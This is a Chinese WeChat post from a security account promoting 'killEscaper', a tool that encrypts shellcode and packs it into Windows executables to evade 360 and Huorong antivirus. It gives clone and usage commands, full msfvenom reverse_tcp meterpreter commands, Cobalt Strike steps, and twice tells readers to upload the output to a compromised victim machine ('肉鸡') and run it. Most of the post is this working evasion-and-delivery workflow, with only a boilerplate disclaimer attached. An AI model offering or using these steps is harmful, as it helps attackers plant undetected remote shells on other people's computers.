#  【免杀工具】killEscaper过360，火绒检测

原创 Anyyy  [ NGC660安全实验室 ](javascript:void\(0\);)

**NGC660安全实验室** ![]()

微信号 NGC660_Team

功能介绍
NGC660安全实验室，致力于网络安全攻防、WEB渗透、内网渗透、代码审计、CTF比赛、红蓝对抗、应急响应、安全架构等技术干货。性痴则其志凝，故书痴者文必工，艺痴者技必良。

____

___发表于_

收录于合集

#NGC660安全实验室 46 个

#Web渗透 14 个

#免杀绕过 2 个

#2023 13 个

#加载器 2 个

  
**点击蓝字，关注我们**  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112617.png)  
  

  

  
  

Github项目：

  * 

    
    
    https://github.com/Anyyy111/killEscaper

 **声明：本工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。**

  
  

  

  
 **介绍**  
  

    killEscaper 是一个利用shellcode来制作免杀exe的工具，可结合渗透工具生成的shellcode二次转换exe，支持红队常用渗透工具CobaltStrike、metasploit等，测试可以绕过火绒、360等杀软，操作系统位数支持32、64位。  

  

    当前处于测试阶段，任何问题欢迎公众号留言

    工具仅支持Windows 且python版本需为 **python3.x**

  
  
 **安装**  

项目拉取：

  * 

    
    
    git clone https://github.com/Anyyy111/killEscaper

模块安装：

   脚本调用的模块都是原生库，注意安装 pyinstaller 即可。

  * 

    
    
     pip install pyinstaller

   并添加 pyinstaller 至系统环境变量。

  
  
 **使用方法**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     _    _ _ _ _____| | _(_) | | ____|___  ___ __ _ _ __   ___ _ __| |/ / | | |  _| / __|/ __/ _` | '_ \ / _ \ '__||   <| | | | |___\__ \ (_| (_| | |_) |  __/ ||_|\_\_|_|_|_____|___/\___\__,_| .__/ \___|_|                               |_|    @Title: killEscaper_ShellCode免杀生成器    @Author: Anyyy    @Blog: https://www.anyiblog.top/    @env：Windows系统、Python3  
      
      
      
    usage: python killEscaper.py -a <32/64> -f <ShellCode File> -i <Icon file>  
      
    使用说明：  
      
    optional arguments:  -h, --help            show this help message and exit  -a ARCH, --arch ARCH  shellcode对应的操作系统位数 默认为64位  -f FILE, --file FILE  任何包含shellcode的Payload文件 用于读取并生成  -i ICON, --icon ICON  exe的Icon图标  -c, --clean           清理output输出文件

  * -f (--file) 必要参数，指定任何包含shellcode的Payload文件，用于读取并生成

  * -a (--arch) 可选参数，shellcode对应的操作系统位数 默认为64位

  * -i (--icon) 可选参数，生成的exe的Icon图标，程序默认图标为exeLogo.ico

  * -c (--clean) 清理output输出文件，程序每次运行会在output生成exe文件，使用该参数可以直接清理

  
 **使用案例**  

根据shellcode生成64位的exe执行文件

  * 

    
    
    python killescaper -f payload64.c #根据shellcode生成64位的exe执行文件

  

根据shellcode生成32位的exe执行文件：

  * 

    
    
    python killescaper -a 32 -f payload32.c #根据shellcode生成32位的exe执行文件

  

自定义图标：

  * 

    
    
    python killescaper -a 64 -f payload64.c -i logo.ico #生成一个以logo.ico为图标的exe执行文件

  

清理输出文件夹：

  * 

    
    
    python killescaper --clean #清理output/所有文件

  

 **metasploit生成免杀**

只讲生成免杀的步骤，执行及如何返回监听请查看 效果演示 的视频。

1.msfvenom生成shellcode

x64:

  * 

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x64 > shellcode.txt

  

x32:

  * 

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x86 > shellcode.txt

  

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112618.png)  
  

  

2.将shellcode.txt复制到本地

3.运行脚本生成exe

python killEscaper.py -a 64 -f shellcode.txt

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112619.png)  
  

  

4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112620.png)  
  

  

5.上传到肉鸡运行

  

 **CobaltStrike生成免杀**

只讲生成免杀的步骤，执行及如何返回监听请查看 **效果演示** 的视频。

  

1.cs生成shellcode

 **x64**

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112621.png)  
  

  

  
  
![]()  
  

 **x32**

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112621.png)  
  

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112623.png)  
  

  

output输出C、python都行。

2.点击Generate到本地payload64.c

3.运行脚本生成exe

  * 

    
    
    python killEscaper.py -a 64 -f payload64.c

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112619.png)  
  

  

4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112620.png)  
  

5.上传到肉鸡运行

  
 **效果演示**  

  

  

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112625.png)  
  

  

  
 **原理**  
  

    程序会将shellcode进行加密，会生成cipher密文和key密钥，密文和密钥每次生成都不同。

  

    模板中定义了解密模块，需要对应的密文密钥才能解密，再将解密后的Payload执行，即执行恶意shellcode返回至监听的cs或msf。

  

    模板写好后再写到python文件中，利用pyinstaller打包成exe，算法绕过了杀软的检测 同时执行shellcode，便成功实现了免杀执行。

  

    算法部分参考免杀工具 BypassAV 的算法并进行了优化。

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112626.png)  

关注公众号，回复  **killEscaper  **获取下载链接

  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112626.png)  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230622112628.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230622112629.png)  
 **往期推荐**  
![](https://gitee.com/fuli009/images/raw/master/public/20230622112630.png)[![]()](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247492115&idx=1&sn=d2b7d4b9651318c60fc8a7ff03ca2401&chksm=c2183755f56fbe43653aec9b01ff06ffa809e630653cdf76d86e6ab36fa0e3eb9f6474975163&token=344247365&lang=zh_CN&scene=21#wechat_redirect)  
从swagger
api泄露到进入后台[![](https://gitee.com/fuli009/images/raw/master/public/20230622112631.png)](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247492072&idx=1&sn=6d06dbc182c2f33037f5687f11bd8650&chksm=c21834aef56fbdb8e46ea1fb878e692883896c0977245b02e8e4209cf194f386191ae7750565&token=344247365&lang=zh_CN&scene=21#wechat_redirect)  
看我如何利用熊猫头插件拿下局长..[![](https://gitee.com/fuli009/images/raw/master/public/20230622112632.png)](https://mp.weixin.qq.com/s?__biz=MzkyODMxODUwNQ==&mid=2247492047&idx=1&sn=691a807e5459496a9efa74c118dae238&chksm=c2183489f56fbd9fe73d6120c231462c892c33beed941d679b036b9d913f0dac0a93bfa64a0b&token=344247365&lang=zh_CN&scene=21#wechat_redirect)  
记一次度某满SRC挖掘之曲线救国 **免责声明**

**由于传播、利用本公众号NGC660安全实验室所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号NGC600安全实验室及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！**

**点点分享**![](https://gitee.com/fuli009/images/raw/master/public/20230622112633.png)
**点点赞**![](https://gitee.com/fuli009/images/raw/master/public/20230622112634.png)
**点点在看**![]()

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

